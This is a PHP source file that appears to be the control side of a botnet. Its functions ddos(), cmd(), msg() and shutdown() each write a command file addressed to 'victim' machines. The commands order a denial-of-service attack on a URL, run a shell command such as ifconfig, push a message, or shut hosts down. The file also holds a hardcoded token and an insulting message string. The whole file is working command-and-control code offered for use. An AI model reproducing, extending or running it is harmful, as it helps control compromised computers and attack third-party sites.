<?php
/*
$id = $_REQUEST["option"];
$personal_token = $_REQUEST["personal_token"];
$url = $_REQUEST["web"];
$message = $_REQUEST["msg"];
$command = $_REQUEST["cmd"];
*/
/*
$random_data = random_bytes(32);
$random_id = hash('crc32', $random_data);
*/
  function ddos(){
    $random_data = random_bytes(32);
    $random_id = hash('crc32', $random_data);
    $xml = new DomDocument('1.0', 'UTF-8');
    $victim = $xml->createElement('victim');
    $victim = $xml->appendChild($victim);
    $victim->setAttribute('all','true');
    $id = $xml->createElement('id', $random_id);
    $id = $victim->appendChild($id);
    $option = $xml->createElement('option','4');
    $option = $victim->appendChild($option);
    $token = $xml->createElement('privtoken','xxxx');
    $token = $victim->appendChild($token);
    $command = $xml->createElement('url','1234');
    $command = $victim->appendChild($command);
    $xml->formatOutput = true;
    $el_xml = $xml->saveXML();
    $xml->save('data/cmd.xml');
  }

  function cmd(){
    $random_data = random_bytes(32);
    $random_id = hash('crc32', $random_data);
    $xml = new DomDocument('1.0', 'UTF-8');
    $victim = $xml->createElement('victim');
    $victim = $xml->appendChild($victim);
    $victim->setAttribute('all','false');
    $id = $xml->createElement('id', $random_id);
    $id = $victim->appendChild($id);
    $option = $xml->createElement('option','1');
    $option = $victim->appendChild($option);
    $token = $xml->createElement('personaltoken','1234');
    $token = $victim->appendChild($token);
    $command = $xml->createElement('command','ifconfig');
    $command = $victim->appendChild($command);
    $xml->formatOutput = true;
    $el_xml = $xml->saveXML();
    $xml->save('data/cmd.xml');
  }

  function msg(){
    $random_data = random_bytes(32);
    $random_id = hash('crc32', $random_data);
    $xml = new DomDocument('1.0', 'UTF-8');
    $victim = $xml->createElement('victim');
    $victim = $xml->appendChild($victim);
    $victim->setAttribute('all','false');
    $id = $xml->createElement('id', $random_id);
    $id = $victim->appendChild($id);
    $option = $xml->createElement('option','3');
    $option = $victim->appendChild($option);
    $token = $xml->createElement('personaltoken','f61e02817051ec013fa287a335bfd205');
    $token = $victim->appendChild($token);
    $command = $xml->createElement('message','thecriw is a shit of paper');
    $command = $victim->appendChild($command);
    $xml->formatOutput = true;
    $el_xml = $xml->saveXML();
    $xml->save('data/cmd.xml');
  }

  function shutdown(){
    $random_data = random_bytes(32);
    $random_id = hash('crc32', $random_data);
    $xml = new DomDocument('1.0', 'UTF-8');
    $victim = $xml->createElement('victim');
    $victim = $xml->appendChild($victim);
    $victim->setAttribute('all','false');
    $id = $xml->createElement('id', $random_id);
    $id = $victim->appendChild($id);
    $option = $xml->createElement('option','2');
    $option = $victim->appendChild($option);
    $token = $xml->createElement('personaltoken','1234');
    $token = $victim->appendChild($token);
    $xml->formatOutput = true;
    $el_xml = $xml->saveXML();
    $xml->save('data/cmd.xml');
  }
  msg();
?>
